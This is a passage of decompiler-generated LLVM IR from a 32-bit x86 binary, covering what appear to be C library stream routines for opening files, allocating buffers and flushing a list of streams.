  %v4_804ba6f = call i32 @function_804efec(i32 %arg4, i32 4, i32 1024, i32 %v1_804ba5d)
  store i32 %v4_804ba6f, i32* %eax.global-to-local, align 4
  %v1_804ba77 = icmp eq i32 %v4_804ba6f, 0
  %v1_804ba79 = icmp eq i1 %v1_804ba77, false
  br i1 %v1_804ba79, label %dec_label_pc_804b9be, label %dec_label_pc_804ba66.dec_label_pc_804ba7f_crit_edge

dec_label_pc_804ba66.dec_label_pc_804ba7f_crit_edge: ; preds = %dec_label_pc_804ba66
  %v0_804ba7f.pre = load i32, i32* @esi, align 4
  %v0_804ba85.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804ba7f

dec_label_pc_804ba7f:                             ; preds = %dec_label_pc_804ba59.dec_label_pc_804ba7f_crit_edge, %dec_label_pc_804ba66.dec_label_pc_804ba7f_crit_edge
  %v0_804ba85 = phi i32 [ %v1_804ba62, %dec_label_pc_804ba59.dec_label_pc_804ba7f_crit_edge ], [ %v0_804ba85.pre, %dec_label_pc_804ba66.dec_label_pc_804ba7f_crit_edge ]
  %v0_804ba7f = phi i32 [ %v0_804ba59, %dec_label_pc_804ba59.dec_label_pc_804ba7f_crit_edge ], [ %v0_804ba7f.pre, %dec_label_pc_804ba66.dec_label_pc_804ba7f_crit_edge ]
  %v1_804ba7f = and i32 %v0_804ba7f, 32768
  %v2_804ba85 = or i32 %v1_804ba7f, %v0_804ba85
  store i32 %v2_804ba85, i32* @ebx, align 4
  br label %dec_label_pc_804baaa

dec_label_pc_804ba89:                             ; preds = %dec_label_pc_804ba3c
  %v1_804ba89 = add i32 %arg4, 1
  %v8_804ba89 = icmp eq i32 %v1_804ba89, 0
  store i32 %v1_804ba89, i32* @edi, align 4
  %v0_804ba95.pre = load i32, i32* @ebx, align 4
  br i1 %v8_804ba89, label %dec_label_pc_804ba8f, label %dec_label_pc_804ba8c

dec_label_pc_804ba8c:                             ; preds = %dec_label_pc_804ba89
  %v11_804ba8c = or i32 %v0_804ba95.pre, 32768
  store i32 %v11_804ba8c, i32* @ebx, align 4
  br label %dec_label_pc_804ba8f

dec_label_pc_804ba8f:                             ; preds = %dec_label_pc_804ba89, %dec_label_pc_804ba8c
  %v0_804ba95 = phi i32 [ %v11_804ba8c, %dec_label_pc_804ba8c ], [ %v0_804ba95.pre, %dec_label_pc_804ba89 ]
  %v0_804ba96 = load i32, i32* @esi, align 4
  store i32 %v0_804ba96, i32* %stack_var_-76, align 4
  %v3_804ba97 = inttoptr i32 %v0_804ba96 to i8*
  %v4_804ba97 = call i32 @function_804f300(i8* %v3_804ba97, i32 %v0_804ba95, i32 438)
  store i32 %v4_804ba97, i32* %eax.global-to-local, align 4
  %v1_804ba9f = load i32, i32* @ebp, align 4
  %v2_804ba9f = add i32 %v1_804ba9f, 4
  %v3_804ba9f = inttoptr i32 %v2_804ba9f to i32*
  store i32 %v4_804ba97, i32* %v3_804ba9f, align 4
  %v2_804baa2 = icmp slt i32 %v4_804ba97, 0
  br i1 %v2_804baa2, label %dec_label_pc_804b9d1, label %dec_label_pc_804baaa

dec_label_pc_804baaa:                             ; preds = %dec_label_pc_804ba8f, %dec_label_pc_804ba7f
  %v0_804baaa = load i32, i32* @ebp, align 4
  %v1_804baaa = inttoptr i32 %v0_804baaa to i16*
  %v2_804baaa = load i16, i16* %v1_804baaa, align 2
  %v3_804baaa = and i16 %v2_804baaa, 8192
  store i16 %v3_804baaa, i16* %v1_804baaa, align 2
  %v0_804bab0 = load i32, i32* @ebx, align 4
  %v8_804bab2 = and i32 %v0_804bab0, -31744
  %v1_804bab7 = urem i32 %v0_804bab0, 4
  %v1_804baba = add nuw nsw i32 %v1_804bab7, 1
  store i32 %v1_804baba, i32* %eax.global-to-local, align 4
  %v1_804babb = load i32, i32* @ebp, align 4
  %v2_804babb = inttoptr i32 %v1_804babb to i32*
  %v3_804babb = load i32, i32* %v2_804babb, align 4
  %v4_804babb = or i32 %v3_804babb, %v8_804bab2
  %v1_804babe = mul nuw nsw i32 %v1_804baba, 16
  %v2_804bac1 = xor i32 %v1_804babe, 48
  store i32 %v2_804bac1, i32* %eax.global-to-local, align 4
  %v2_804bac4 = or i32 %v4_804babb, %v2_804bac1
  store i32 %v2_804bac4, i32* @ebx, align 4
  %v1_804bac6 = trunc i32 %v2_804bac4 to i16
  %v3_804bac6 = inttoptr i32 %v1_804babb to i16*
  store i16 %v1_804bac6, i16* %v3_804bac6, align 2
  %v0_804baca = load i32, i32* %stack_var_-76, align 4
  %v1_804baca = call i32 @function_804b4bc(i32 %v0_804baca)
  store i32 %v1_804baca, i32* %eax.global-to-local, align 4
  store i32 %v1_804baca, i32* @esi, align 4
  %v1_804bad4 = inttoptr i32 %v1_804baca to i32*
  %v2_804bad4 = load i32, i32* %v1_804bad4, align 4
  store i32 %v2_804bad4, i32* @edi, align 4
  %v0_804bad6 = load i32, i32* @ebp, align 4
  %v1_804bad6 = add i32 %v0_804bad6, 4
  %v2_804bad6 = inttoptr i32 %v1_804bad6 to i32*
  %v3_804bad6 = load i32, i32* %v2_804bad6, align 4
  store i32 %v3_804bad6, i32* %stack_var_-76, align 4
  %v1_804bad9 = call i32 @function_804d068(i32 %v3_804bad6)
  %v2_804bae1 = mul i32 %v1_804bad9, 256
  store i32 %v2_804bae1, i32* %eax.global-to-local, align 4
  %v0_804bae4 = load i32, i32* @ebx, align 4
  %v2_804bae4 = or i32 %v0_804bae4, %v2_804bae1
  store i32 %v2_804bae4, i32* @ebx, align 4
  %v1_804bae6 = trunc i32 %v2_804bae4 to i16
  %v2_804bae6 = load i32, i32* @ebp, align 4
  %v3_804bae6 = inttoptr i32 %v2_804bae6 to i16*
  store i16 %v1_804bae6, i16* %v3_804bae6, align 2
  %v0_804baea = load i32, i32* @edi, align 4
  %v1_804baea = load i32, i32* @esi, align 4
  %v2_804baea = inttoptr i32 %v1_804baea to i32*
  store i32 %v0_804baea, i32* %v2_804baea, align 4
  %v0_804baec = load i32, i32* @ebp, align 4
  %v1_804baec = add i32 %v0_804baec, 8
  %v2_804baec = inttoptr i32 %v1_804baec to i32*
  %v3_804baec = load i32, i32* %v2_804baec, align 4
  %v4_804baec = icmp eq i32 %v3_804baec, 0
  %v1_804baf0 = icmp eq i1 %v4_804baec, false
  br i1 %v1_804baf0, label %dec_label_pc_804bb20, label %dec_label_pc_804baf2

dec_label_pc_804baf2:                             ; preds = %dec_label_pc_804baaa
  store i32 4096, i32* %stack_var_-76, align 4
  %v1_804bafa = call i32 @function_804d73a(i32 4096)
  store i32 %v1_804bafa, i32* %eax.global-to-local, align 4
  %v1_804bb02 = load i32, i32* @ebp, align 4
  %v2_804bb02 = add i32 %v1_804bb02, 8
  %v3_804bb02 = inttoptr i32 %v2_804bb02 to i32*
  store i32 %v1_804bafa, i32* %v3_804bb02, align 4
  %v1_804bb05 = icmp eq i32 %v1_804bafa, 0
  %v0_804bb19 = load i32, i32* @ebp, align 4
  br i1 %v1_804bb05, label %dec_label_pc_804bb19, label %dec_label_pc_804bb09

dec_label_pc_804bb09:                             ; preds = %dec_label_pc_804baf2
  %v1_804bb09 = inttoptr i32 %v0_804bb19 to i16*
  %v2_804bb09 = load i16, i16* %v1_804bb09, align 2
  %v3_804bb09 = or i16 %v2_804bb09, 16384
  store i16 %v3_804bb09, i16* %v1_804bb09, align 2
  %v1_804bb0f = add i32 %v1_804bafa, 4096
  store i32 %v1_804bb0f, i32* %eax.global-to-local, align 4
  %v1_804bb14 = load i32, i32* @ebp, align 4
  %v2_804bb14 = add i32 %v1_804bb14, 12
  %v3_804bb14 = inttoptr i32 %v2_804bb14 to i32*
  store i32 %v1_804bb0f, i32* %v3_804bb14, align 4
  br label %dec_label_pc_804bb20

dec_label_pc_804bb19:                             ; preds = %dec_label_pc_804baf2
  %v1_804bb19 = add i32 %v0_804bb19, 12
  %v2_804bb19 = inttoptr i32 %v1_804bb19 to i32*
  store i32 0, i32* %v2_804bb19, align 4
  br label %dec_label_pc_804bb20

dec_label_pc_804bb20:                             ; preds = %dec_label_pc_804baaa, %dec_label_pc_804bb09, %dec_label_pc_804bb19
  %v0_804bb20 = load i32, i32* @ebp, align 4
  %v1_804bb20 = add i32 %v0_804bb20, 8
  %v2_804bb20 = inttoptr i32 %v1_804bb20 to i32*
  %v3_804bb20 = load i32, i32* %v2_804bb20, align 4
  store i32 %v3_804bb20, i32* %eax.global-to-local, align 4
  %v1_804bb23 = add i32 %v0_804bb20, 2
  %v2_804bb23 = inttoptr i32 %v1_804bb23 to i8*
  store i8 0, i8* %v2_804bb23, align 1
  %v0_804bb27 = load i32, i32* %eax.global-to-local, align 4
  %v1_804bb27 = load i32, i32* @ebp, align 4
  %v2_804bb27 = add i32 %v1_804bb27, 24
  %v3_804bb27 = inttoptr i32 %v2_804bb27 to i32*
  store i32 %v0_804bb27, i32* %v3_804bb27, align 4
  %v0_804bb2a = load i32, i32* %eax.global-to-local, align 4
  %v1_804bb2a = load i32, i32* @ebp, align 4
  %v2_804bb2a = add i32 %v1_804bb2a, 28
  %v3_804bb2a = inttoptr i32 %v2_804bb2a to i32*
  store i32 %v0_804bb2a, i32* %v3_804bb2a, align 4
  %v0_804bb2d = load i32, i32* %eax.global-to-local, align 4
  %v1_804bb2d = load i32, i32* @ebp, align 4
  %v2_804bb2d = add i32 %v1_804bb2d, 16
  %v3_804bb2d = inttoptr i32 %v2_804bb2d to i32*
  store i32 %v0_804bb2d, i32* %v3_804bb2d, align 4
  %v0_804bb30 = load i32, i32* %eax.global-to-local, align 4
  %v1_804bb30 = load i32, i32* @ebp, align 4
  %v2_804bb30 = add i32 %v1_804bb30, 20
  %v3_804bb30 = inttoptr i32 %v2_804bb30 to i32*
  store i32 %v0_804bb30, i32* %v3_804bb30, align 4
  %v0_804bb33 = load i32, i32* @ebp, align 4
  %v1_804bb33 = add i32 %v0_804bb33, 44
  %v2_804bb33 = inttoptr i32 %v1_804bb33 to i32*
  store i32 0, i32* %v2_804bb33, align 4
  %v0_804bb3a = load i32, i32* @ebp, align 4
  %v1_804bb3a = add i32 %v0_804bb3a, 1
  %v2_804bb3a = inttoptr i32 %v1_804bb3a to i8*
  %v3_804bb3a = load i8, i8* %v2_804bb3a, align 1
  %v4_804bb3a = and i8 %v3_804bb3a, 32
  %v5_804bb3a = icmp eq i8 %v4_804bb3a, 0
  %v0_804bb3e = load i32, i32* @global_var_80557d0.115, align 16
  store i32 %v0_804bb3e, i32* @eax, align 4
  %v2_804bb43 = add i32 %v0_804bb3a, 52
  %v3_804bb43 = inttoptr i32 %v2_804bb43 to i32*
  store i32 %v0_804bb3e, i32* %v3_804bb43, align 4
  br i1 %v5_804bb3a, label %dec_label_pc_804bbb5, label %dec_label_pc_804bb48

dec_label_pc_804bb48:                             ; preds = %dec_label_pc_804bb20
  %v2_804bb53 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804bb53, i32* %stack_var_-76, align 4
  %v2_804bb58 = call i32 @function_804ec6e(i32 %v2_804bb53, i32 134540395)
  store i32 %v2_804bb58, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80557b8.107 to i32), i32* %stack_var_-76, align 4
  %v1_804bb64 = call i32 @function_804ec6b(i32 ptrtoint (i32* @global_var_80557b8.107 to i32))
  store i32 %v1_804bb64, i32* @eax, align 4
  %v2_804bb76 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804bb76, i32* %stack_var_-76, align 4
  %v2_804bb7b = call i32 @function_804ec6e(i32 %v2_804bb76, i32 134540395)
  store i32 %v2_804bb7b, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80557a0.116 to i32), i32* %stack_var_-76, align 4
  %v1_804bb87 = call i32 @function_804ec6b(i32 ptrtoint (i32* @global_var_80557a0.116 to i32))
  %v0_804bb8c = load i32, i32* bitcast (i32** @global_var_805579c.117 to i32*), align 4
  store i32 %v0_804bb8c, i32* @eax, align 4
  %v1_804bb91 = load i32, i32* @ebp, align 4
  %v2_804bb91 = add i32 %v1_804bb91, 32
  %v3_804bb91 = inttoptr i32 %v2_804bb91 to i32*
  store i32 %v0_804bb8c, i32* %v3_804bb91, align 4
  %v0_804bb94 = load i32, i32* @ebp, align 4
  store i32 %v0_804bb94, i32* bitcast (i32** @global_var_805579c.117 to i32*), align 4
  %v2_804bb9a = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_804bb9a, i32* @ecx, align 4
  store i32 %v2_804bb76, i32* %stack_var_-76, align 4
  %v2_804bb9f = call i32 @function_804ec6e(i32 %v2_804bb76, i32 1)
  store i32 %v2_804bb76, i32* @eax, align 4
  store i32 1, i32* @edx, align 4
  store i32 %v2_804bb53, i32* %stack_var_-76, align 4
  %v2_804bba9 = call i32 @function_804ec6e(i32 %v2_804bb53, i32 1)
  store i32 %v2_804bba9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bbae

dec_label_pc_804bbae:                             ; preds = %dec_label_pc_804b9db, %dec_label_pc_804bb48
  br label %dec_label_pc_804bbb5

dec_label_pc_804bbb3:                             ; preds = %dec_label_pc_804b9d1, %dec_label_pc_804b9be
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804bbb5

dec_label_pc_804bbb5:                             ; preds = %dec_label_pc_804bb20, %dec_label_pc_804ba0a, %dec_label_pc_804bbae, %dec_label_pc_804bbb3
  %v0_804bbb8 = load i32, i32* @ebp, align 4
  store i32 %v0_804bbb8, i32* %eax.global-to-local, align 4
  %v2_804bbba = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804bbba, i32* @ebx, align 4
  store i32 %v0_804b992, i32* @esi, align 4
  store i32 %v0_804b991, i32* @edi, align 4
  store i32 %v0_804b990, i32* @ebp, align 4
  ret i32 %v0_804bbb8

; uselistorder directives
  uselistorder i32 %v2_804bb76, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_804bb53, { 1, 0, 3, 2 }
  uselistorder i32 %v0_804bb19, { 1, 0 }
  uselistorder i32 %v1_804bafa, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804bae1, { 1, 0 }
  uselistorder i32 %v1_804baca, { 1, 0, 2 }
  uselistorder i32 %v11_804ba8c, { 1, 0 }
  uselistorder i32 %v0_804ba95.pre, { 1, 0 }
  uselistorder i32 %v1_804ba5d, { 2, 1, 0 }
  uselistorder i32 %v0_804ba59, { 1, 0 }
  uselistorder i32 %v1_804ba4e, { 1, 0, 2 }
  uselistorder i32 %v1_804ba0f, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v0_804b9fe, { 1, 0 }
  uselistorder i32 %v0_804b9d1, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29 }
  uselistorder i32 %arg4, { 0, 2, 1, 4, 3, 5 }
  uselistorder label %dec_label_pc_804bbb5, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804bbae, { 1, 0 }
  uselistorder label %dec_label_pc_804bb20, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ba8f, { 1, 0 }
  uselistorder label %dec_label_pc_804ba7f, { 1, 0 }
  uselistorder label %dec_label_pc_804ba3c, { 1, 0 }
  uselistorder label %dec_label_pc_804ba06, { 1, 0 }
  uselistorder label %dec_label_pc_804b9f8, { 1, 0 }
  uselistorder label %dec_label_pc_804b9ed, { 2, 0, 1 }
}

define i32 @function_804bbc0() local_unnamed_addr {
dec_label_pc_804bbc0:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804bbc1 = load i32, i32* @edi, align 4
  %v0_804bbc2 = load i32, i32* @esi, align 4
  %v0_804bbc3 = load i32, i32* @ebx, align 4
  store i32 %v0_804bbc3, i32* %stack_var_-16, align 4
  store i32 1, i32* @ebx, align 4
  %v1_804bbcc = call i32 @function_804b4bc(i32 %v0_804bbc3)
  store i32 %v1_804bbcc, i32* @edi, align 4
  %v0_804bbd6 = load i32, i32* @global_var_80557e0.103, align 32
  store i32 %v0_804bbd6, i32* @esi, align 4
  %v1_804bbdc = inttoptr i32 %v1_804bbcc to i32*
  %v2_804bbdc = load i32, i32* %v1_804bbdc, align 4
  store i32 %v2_804bbdc, i32* %ebp.global-to-local, align 4
  %v1_804bbe0 = call i32 @function_804d068(i32 0)
  %v0_804bbe5 = load i32, i32* @ebx, align 4
  %v2_804bbe7 = sub i32 %v0_804bbe5, %v1_804bbe0
  %v2_804bbf2 = mul i32 %v2_804bbe7, 256
  %v0_804bbf5 = load i32, i32* @esi, align 4
  %v2_804bbf5 = xor i32 %v0_804bbf5, %v2_804bbf2
  %v1_804bbf7 = trunc i32 %v2_804bbf5 to i16
  store i16 %v1_804bbf7, i16* bitcast (i32* @global_var_80557e0.103 to i16*), align 32
  %v0_804bbfe = load i32, i32* @global_var_8055830.104, align 16
  store i32 %v0_804bbfe, i32* @esi, align 4
  %v1_804bc04 = call i32 @function_804d068(i32 1)
  %v0_804bc09 = load i32, i32* @ebx, align 4
  %v2_804bc09 = sub i32 %v0_804bc09, %v1_804bc04
  %v2_804bc0b = mul i32 %v2_804bc09, 256
  %v0_804bc0e = load i32, i32* @esi, align 4
  %v2_804bc0e = xor i32 %v2_804bc0b, %v0_804bc0e
  %v1_804bc10 = trunc i32 %v2_804bc0e to i16
  store i16 %v1_804bc10, i16* bitcast (i32* @global_var_8055830.104 to i16*), align 16
  %v0_804bc17 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804bc17 = load i32, i32* @edi, align 4
  %v2_804bc17 = inttoptr i32 %v1_804bc17 to i32*
  store i32 %v0_804bc17, i32* %v2_804bc17, align 4
  %v2_804bc1c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804bc1c, i32* @ebx, align 4
  store i32 %v0_804bbc2, i32* @esi, align 4
  store i32 %v0_804bbc1, i32* @edi, align 4
  ret i32 %v1_804bc04

; uselistorder directives
  uselistorder i32 %v1_804bbcc, { 1, 0 }
  uselistorder i32 (i32)* @function_804d068, { 1, 0, 2 }
}

define i32 @function_804bc21(i32 %arg1) local_unnamed_addr {
dec_label_pc_804bc21:
  %v3_804bc2f = inttoptr i32 %arg1 to i16*
  %v4_804bc2f = call i32 @function_804ce38(i16* %v3_804bc2f, i32 ptrtoint (i32* @global_var_805300c.118 to i32), i32 24)
  ret i32 %v4_804bc2f
}

define i32 @function_804bc38() local_unnamed_addr {
dec_label_pc_804bc38:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804bc38 = load i32, i32* @esi, align 4
  %v0_804bc39 = load i32, i32* @ebx, align 4
  store i32 %v0_804bc39, i32* %stack_var_-8, align 4
  %v1_804bc42 = call i32 @function_804bc21(i32 ptrtoint (i32* @global_var_80557a0.116 to i32))
  store i32 %v1_804bc42, i32* %eax.global-to-local, align 4
  %v1_804bc4e = call i32 @function_804bc21(i32 ptrtoint (i32* @global_var_80557b8.107 to i32))
  store i32 %v1_804bc4e, i32* %eax.global-to-local, align 4
  %storemerge21 = load i32, i32* bitcast (i32** @global_var_805579c.117 to i32*), align 4
  store i32 %storemerge21, i32* %ebx.global-to-local, align 4
  %v1_804bc9822 = icmp eq i32 %storemerge21, 0
  %v1_804bc9a23 = icmp eq i1 %v1_804bc9822, false
  br i1 %v1_804bc9a23, label %dec_label_pc_804bc5b.lr.ph, label %dec_label_pc_804bcb8.preheader

dec_label_pc_804bc5b.lr.ph:                       ; preds = %dec_label_pc_804bc38
  br label %dec_label_pc_804bc5b

dec_label_pc_804bc5b:                             ; preds = %dec_label_pc_804bc5b.lr.ph, %dec_label_pc_804bc82
  %storemerge24 = phi i32 [ %storemerge21, %dec_label_pc_804bc5b.lr.ph ], [ %storemerge, %dec_label_pc_804bc82 ]
  %v1_804bc5e = add i32 %storemerge24, 56
  store i32 %v1_804bc5e, i32* @esi, align 4
  %v1_804bc62 = call i32 @function_804ec6b(i32 %v1_804bc5e)
  store i32 %v1_804bc62, i32* %eax.global-to-local, align 4
  %v1_804bc6a = icmp eq i32 %v1_804bc62, 0
  br i1 %v1_804bc6a, label %dec_label_pc_804bc82, label %dec_label_pc_804bc6e

dec_label_pc_804bc6e:                             ; preds = %dec_label_pc_804bc5b
  %v0_804bc6e = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bc6e = add i32 %v0_804bc6e, 8
  %v2_804bc6e = inttoptr i32 %v1_804bc6e to i32*
  %v3_804bc6e = load i32, i32* %v2_804bc6e, align 4
  store i32 %v3_804bc6e, i32* %eax.global-to-local, align 4
  %v1_804bc71 = inttoptr i32 %v0_804bc6e to i16*
  store i16 48, i16* %v1_804bc71, align 2
  %v0_804bc76 = load i32, i32* %eax.global-to-local, align 4
  %v1_804bc76 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804bc76 = add i32 %v1_804bc76, 24
  %v3_804bc76 = inttoptr i32 %v2_804bc76 to i32*
  store i32 %v0_804bc76, i32* %v3_804bc76, align 4
  %v0_804bc79 = load i32, i32* %eax.global-to-local, align 4
  %v1_804bc79 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804bc79 = add i32 %v1_804bc79, 28
  %v3_804bc79 = inttoptr i32 %v2_804bc79 to i32*
  store i32 %v0_804bc79, i32* %v3_804bc79, align 4
  %v0_804bc7c = load i32, i32* %eax.global-to-local, align 4
  %v1_804bc7c = load i32, i32* %ebx.global-to-local, align 4
  %v2_804bc7c = add i32 %v1_804bc7c, 16
  %v3_804bc7c = inttoptr i32 %v2_804bc7c to i32*
  store i32 %v0_804bc7c, i32* %v3_804bc7c, align 4
  %v0_804bc7f = load i32, i32* %eax.global-to-local, align 4
  %v1_804bc7f = load i32, i32* %ebx.global-to-local, align 4
  %v2_804bc7f = add i32 %v1_804bc7f, 20
  %v3_804bc7f = inttoptr i32 %v2_804bc7f to i32*
  store i32 %v0_804bc7f, i32* %v3_804bc7f, align 4
  br label %dec_label_pc_804bc82

dec_label_pc_804bc82:                             ; preds = %dec_label_pc_804bc5b, %dec_label_pc_804bc6e
  %v0_804bc85 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bc85 = add i32 %v0_804bc85, 52
  %v2_804bc85 = inttoptr i32 %v1_804bc85 to i32*
  store i32 1, i32* %v2_804bc85, align 4
  %v0_804bc8c = load i32, i32* @esi, align 4
  %v1_804bc8d = call i32 @function_804bc21(i32 %v0_804bc8c)
  store i32 %v1_804bc8d, i32* %eax.global-to-local, align 4
  %v0_804bc92 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bc92 = add i32 %v0_804bc92, 32
  %v2_804bc92 = inttoptr i32 %v1_804bc92 to i32*
  %storemerge = load i32, i32* %v2_804bc92, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_804bc98 = icmp eq i32 %storemerge, 0
  %v1_804bc9a = icmp eq i1 %v1_804bc98, false
  br i1 %v1_804bc9a, label %dec_label_pc_804bc5b, label %dec_label_pc_804bc95.dec_label_pc_804bcb8.preheader_crit_edge

dec_label_pc_804bc95.dec_label_pc_804bcb8.preheader_crit_edge: ; preds = %dec_label_pc_804bc82
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_805579c.117 to i32*), align 4
  br label %dec_label_pc_804bcb8.preheader

dec_label_pc_804bcb8.preheader:                   ; preds = %dec_label_pc_804bc95.dec_label_pc_804bcb8.preheader_crit_edge, %dec_label_pc_804bc38
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_804bc95.dec_label_pc_804bcb8.preheader_crit_edge ], [ %storemerge21, %dec_label_pc_804bc38 ]
  store i32 %storemerge12, i32* @ebx, align 4
  %v1_804bcb83 = icmp eq i32 %storemerge12, 0
  %v1_804bcba10 = icmp eq i1 %v1_804bcb83, false
  br i1 %v1_804bcba10, label %dec_label_pc_804bca4.preheader, label %dec_label_pc_804bcbc

dec_label_pc_804bca4.preheader:                   ; preds = %dec_label_pc_804bcb8.preheader
  br label %dec_label_pc_804bca4

dec_label_pc_804bca4:                             ; preds = %dec_label_pc_804bca4.preheader, %dec_label_pc_804bcb5
  %v0_804bcac = phi i32 [ %storemerge1, %dec_label_pc_804bcb5 ], [ %storemerge12, %dec_label_pc_804bca4.preheader ]
  %v1_804bca4 = inttoptr i32 %v0_804bcac to i8*
  %v2_804bca4 = load i8, i8* %v1_804bca4, align 1
  %v3_804bca4 = and i8 %v2_804bca4, 64
  %v4_804bca4 = icmp eq i8 %v3_804bca4, 0
  br i1 %v4_804bca4, label %dec_label_pc_804bcb5, label %dec_label_pc_804bca9

dec_label_pc_804bca9:                             ; preds = %dec_label_pc_804bca4
  %v1_804bcad = call i32 @function_804bcc0(i32 %v0_804bcac)
  store i32 %v1_804bcad, i32* %eax.global-to-local, align 4
  %v0_804bcb5.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804bcb5

dec_label_pc_804bcb5:                             ; preds = %dec_label_pc_804bca4, %dec_label_pc_804bca9
  %v0_804bcb5 = phi i32 [ %v0_804bcac, %dec_label_pc_804bca4 ], [ %v0_804bcb5.pre, %dec_label_pc_804bca9 ]
  %v1_804bcb5 = add i32 %v0_804bcb5, 32
  %v2_804bcb5 = inttoptr i32 %v1_804bcb5 to i32*
  %storemerge1 = load i32, i32* %v2_804bcb5, align 4
  store i32 %storemerge1, i32* @ebx, align 4
  %v1_804bcb8 = icmp eq i32 %storemerge1, 0
  %v1_804bcba = icmp eq i1 %v1_804bcb8, false
  br i1 %v1_804bcba, label %dec_label_pc_804bca4, label %dec_label_pc_804bcbc

dec_label_pc_804bcbc:                             ; preds = %dec_label_pc_804bcb5, %dec_label_pc_804bcb8.preheader
  %v2_804bcbc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804bcbc, i32* %eax.global-to-local, align 4
  %v2_804bcbd = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804bcbd, i32* @ebx, align 4
  store i32 %v0_804bc38, i32* @esi, align 4
  ret i32 %v2_804bcbc

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32* %ebx.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 (i32)* @function_804bc21, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_804bcb5, { 1, 0 }
  uselistorder label %dec_label_pc_804bca4, { 1, 0 }
  uselistorder label %dec_label_pc_804bc82, { 1, 0 }
  uselistorder label %dec_label_pc_804bc5b, { 1, 0 }
}

define i32 @function_804bcc0(i32 %arg1) local_unnamed_addr {
dec_label_pc_804bcc0:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_804bcc0 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804bcc8 = add i32 %arg1, 8
  %v2_804bcc8 = inttoptr i32 %v1_804bcc8 to i32*
  %v3_804bcc8 = load i32, i32* %v2_804bcc8, align 4
  store i32 %v3_804bcc8, i32* %edx.global-to-local, align 4
  %v1_804bccb = add i32 %arg1, 16
  %v2_804bccb = inttoptr i32 %v1_804bccb to i32*
  %v3_804bccb = load i32, i32* %v2_804bccb, align 4
  %v2_804bcce = sub i32 %v3_804bccb, %v3_804bcc8
  %v12_804bcce = icmp eq i32 %v2_804bcce, 0
  store i32 %v2_804bcce, i32* %eax.global-to-local, align 4
  br i1 %v12_804bcce, label %dec_label_pc_804bce1, label %dec_label_pc_804bcd2

dec_label_pc_804bcd2:                             ; preds = %dec_label_pc_804bcc0
  store i32 %v3_804bcc8, i32* %v2_804bccb, align 4
  %v0_804bcd5 = load i32, i32* @ecx, align 4
  %v0_804bcd6 = load i32, i32* %eax.global-to-local, align 4
  %v0_804bcd7 = load i32, i32* %edx.global-to-local, align 4
  %v0_804bcd8 = load i32, i32* @ebx, align 4
  %v4_804bcd9 = inttoptr i32 %v0_804bcd8 to i16*
  %v5_804bcd9 = call i32 @function_804f5a0(i16* %v4_804bcd9, i32 %v0_804bcd7, i32 %v0_804bcd6, i32 %v0_804bcd5)
  store i32 %v5_804bcd9, i32* %eax.global-to-local, align 4
  %v0_804bce1.pre = load i32, i32* @ebx, align 4
  %v2_804bce7.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804bce1

dec_label_pc_804bce1:                             ; preds = %dec_label_pc_804bcc0, %dec_label_pc_804bcd2
  %v2_804bce7 = phi i32 [ %tmp11, %dec_label_pc_804bcc0 ], [ %v2_804bce7.pre, %dec_label_pc_804bcd2 ]
  %v0_804bce1 = phi i32 [ %arg1, %dec_label_pc_804bcc0 ], [ %v0_804bce1.pre, %dec_label_pc_804bcd2 ]
  %v1_804bce1 = add i32 %v0_804bce1, 16
  %v2_804bce1 = inttoptr i32 %v1_804bce1 to i32*
  %v3_804bce1 = load i32, i32* %v2_804bce1, align 4
  store i32 %v3_804bce1, i32* %eax.global-to-local, align 4
  %v2_804bce4 = add i32 %v0_804bce1, 8
  %v3_804bce4 = inttoptr i32 %v2_804bce4 to i32*
  %v4_804bce4 = load i32, i32* %v3_804bce4, align 4
